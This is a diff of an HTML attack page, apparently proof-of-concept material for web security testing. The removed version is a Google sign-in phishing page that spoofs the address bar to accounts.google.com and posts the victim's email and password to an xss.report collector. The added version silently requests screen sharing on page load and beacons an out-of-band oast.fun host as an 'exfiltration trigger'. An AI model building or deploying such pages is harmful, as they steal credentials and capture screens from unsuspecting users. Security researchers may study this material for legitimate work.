@@ -2,73 +2,53 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Sign in – Google Accounts</title>
+  <title>Screen Access</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" type="image/png">
   <style>
-    body {
+    html, body {
       margin: 0;
-      background: white;
-      font-family: Arial, sans-serif;
-    }
-    .container {
-      max-width: 400px;
-      margin: 60px auto;
-      padding: 20px;
-    }
-    .logo {
-      display: block;
-      margin: 0 auto 20px;
-      width: 75px;
-    }
-    input {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      margin: 12px 0;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #1a73e8;
+      background: #111;
       color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
+      font-family: -apple-system, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    #status {
       margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" class="logo" alt="Google">
-  <h2>Sign in</h2>
-  <p>Use your Google Account</p>
-
-  <form id="phishForm">
-    <input type="email" name="email" placeholder="Email or phone" autocomplete="email" required>
-    <input type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
-    <button type="submit">Next</button>
-  </form>
-</div>
+<h2>Preparing screen sharing session…</h2>
+<p id="status">Waiting for permissions...</p>
 
 <script>
-  // Spoof the URL bar with Google domain
-  history.pushState({}, "", "https://accounts.google.com/ServiceLogin");
+  window.onload = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
 
-  // Phish exfiltration
-  document.getElementById("phishForm").onsubmit = (e) => {
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    fetch("https://xss.report/c/waduh", {
-      method: "POST",
-      body: formData
-    });
-    alert("Invalid credentials. Please try again.");
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.autoplay = true;
+      video.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1000;";
+      document.body.appendChild(video);
+
+      document.getElementById("status").textContent = "✅ Screen stream started (no gesture).";
+
+      // Optional: exfiltration trigger
+      navigator.sendBeacon("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", "stream started");
+
+    } catch (err) {
+      document.getElementById("status").textContent = "❌ Access denied or blocked.";
+      console.error("Error:", err);
+    }
   };
 </script>
 
